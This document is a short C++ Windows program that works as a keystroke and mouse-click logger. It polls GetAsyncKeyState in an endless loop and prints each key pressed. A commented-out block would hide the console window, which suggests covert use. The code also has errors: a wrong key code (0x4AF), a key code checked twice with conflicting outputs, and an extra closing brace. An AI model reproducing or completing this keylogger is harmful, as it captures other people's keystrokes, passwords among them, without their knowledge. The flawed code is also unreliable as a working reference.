#include <iostream>
#include <windows.h>
#include <conio.h>
#include <wtypes.h>
using namespace std;




int main() {
	/*HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
	*/
	while (true) {
		if (GetAsyncKeyState(0x01) == -32767) {
			cout << " \"LCLICK\" ";
		} else if (GetAsyncKeyState(0x02) == -32767) {
			cout << " \"RCLICK\" ";
		} else if (GetAsyncKeyState(0x04) == -32767) {
			cout << " \"MCLICK\" ";
		} else if (GetAsyncKeyState(0x05) == -32767) {
			cout << " \"X1MOUSE\" ";
		} else if (GetAsyncKeyState(0x06) == -32767) {
			cout << " \"X2MOUSE\" ";
		} else if (GetAsyncKeyState(0x08) == -32767) {
			cout << " \"BACKSPACE\" ";
		} else if (GetAsyncKeyState(0x24) == -32767) {
			cout << " \"HOME\" ";
		} else if (GetAsyncKeyState(0x25) == -32767) {
			cout << " \"LEFT-ARROW\" ";
		} else if (GetAsyncKeyState(0x26) == -32767) {
			cout << " \"UP-ARROW\" ";
		} else if (GetAsyncKeyState(0x27) == -32767) {
			cout << " \"RIGHT-ARROW\" ";
		} else if (GetAsyncKeyState(0x28) == -32767) {
			cout << " \"DOWN-ARROW\" ";
		} else if (GetAsyncKeyState(0x29) == -32767) {
			cout << " \"SELECT\" ";
		} else if (GetAsyncKeyState(0x30) == -32767) {
			cout << "0";
		} else if (GetAsyncKeyState(0x31) == -32767) {
			cout << "1";
		} else if (GetAsyncKeyState(0x32) == -32767) {
			cout << "2";
		} else if (GetAsyncKeyState(0x33) == -32767) {
			cout << "3";
		} else if (GetAsyncKeyState(0x34) == -32767) {
			cout << "4";
		} else if (GetAsyncKeyState(0x35) == -32767) {
			cout << "5";
		} else if (GetAsyncKeyState(0x36) == -32767) {
			cout << "6";
		} else if (GetAsyncKeyState(0x37) == -32767) {
			cout << "7";
		} else if (GetAsyncKeyState(0x38) == -32767) {
			cout << "8";
		} else if (GetAsyncKeyState(0x39) == -32767) {
			cout << "9";
		} else if (GetAsyncKeyState(0x40) == -32767) {
			cout << " \"UNDEFINED\" ";
		} else if (GetAsyncKeyState(0x41) == -32767) {
			cout << "A";
		} else if (GetAsyncKeyState(0x42) == -32767) {
			cout << "B";
		} else if (GetAsyncKeyState(0x43) == -32767) {
			cout << "C";
		} else if (GetAsyncKeyState(0x44) == -32767) {
			cout << "D";
		} else if (GetAsyncKeyState(0x45) == -32767) {
			cout << "E";
		} else if (GetAsyncKeyState(0x46) == -32767) {
			cout << "F";
		} else if (GetAsyncKeyState(0x47) == -32767) {
			cout << "G";
		} else if (GetAsyncKeyState(0x48) == -32767) {
			cout << "H";
		} else if (GetAsyncKeyState(0x49) == -32767) {
			cout << "I";
		} else if (GetAsyncKeyState(0x4A) == -32767) {
			cout << "J";
		} else if (GetAsyncKeyState(0x4B) == -32767) {
			cout << "K";
		} else if (GetAsyncKeyState(0x4C) == -32767) {
			cout << "L";
		} else if (GetAsyncKeyState(0x4D) == -32767) {
			cout << "M";
		} else if (GetAsyncKeyState(0x4E) == -32767) {
			cout << "N";
		} else if (GetAsyncKeyState(0x4AF) == -32767) {
			cout << "O";
		} else if (GetAsyncKeyState(0x50) == -32767) {
			cout << "P";
		} else if (GetAsyncKeyState(0x51) == -32767) {
			cout << "Q";
		} else if (GetAsyncKeyState(0x52) == -32767) {
			cout << "R";
		} else if (GetAsyncKeyState(0x53) == -32767) {
			cout << "S";
		} else if (GetAsyncKeyState(0x54) == -32767) {
			cout << "T";
		} else if (GetAsyncKeyState(0x55) == -32767) {
			cout << "U";
		} else if (GetAsyncKeyState(0x56) == -32767) {
			cout << "V";
		} else if (GetAsyncKeyState(0x57) == -32767) {
			cout << "W";
		} else if (GetAsyncKeyState(0x58) == -32767) {
			cout << "X";
		} else if (GetAsyncKeyState(0x59) == -32767) {
			cout << "Y";
		} else if (GetAsyncKeyState(0x5A) == -32767) {
			cout << "Z";
		} else if (GetAsyncKeyState(0x60) == -32767) {
			cout << "0";
		} else if (GetAsyncKeyState(0x61) == -32767) {
			cout << "1";
		} else if (GetAsyncKeyState(0x62) == -32767) {
			cout << "2";
		} else if (GetAsyncKeyState(0x63) == -32767) {
			cout << "3";
		} else if (GetAsyncKeyState(0x64) == -32767) {
			cout << "4";
		} else if (GetAsyncKeyState(0x65) == -32767) {
			cout << "5";
		} else if (GetAsyncKeyState(0x66) == -32767) {
			cout << "6";
		} else if (GetAsyncKeyState(0x67) == -32767) {
			cout << "7";
		} else if (GetAsyncKeyState(0x68) == -32767) {
			cout << "8";
		} else if (GetAsyncKeyState(0x69) == -32767) {
			cout << "9";
		} else if (GetAsyncKeyState(0x6A) == -32767) {
			cout << "*";
		} else if (GetAsyncKeyState(0xBB) == -32767) {
			cout << "+";
		} else if (GetAsyncKeyState(0x6C) == -32767) {
			cout << "|";
		} else if (GetAsyncKeyState(0xBD) == -32767) {
			cout << "-";
		} else if (GetAsyncKeyState(0xBB) == -32767) {
			cout << ",";
		} else if (GetAsyncKeyState(0x6F) == -32767) {
			cout << "/";
		} else if (GetAsyncKeyState(0xBE) == -32767) {
			cout << ".";
		} //else if (GetAsyncKeyState() == -32767) {
			//cout << "";

		}
	}
}

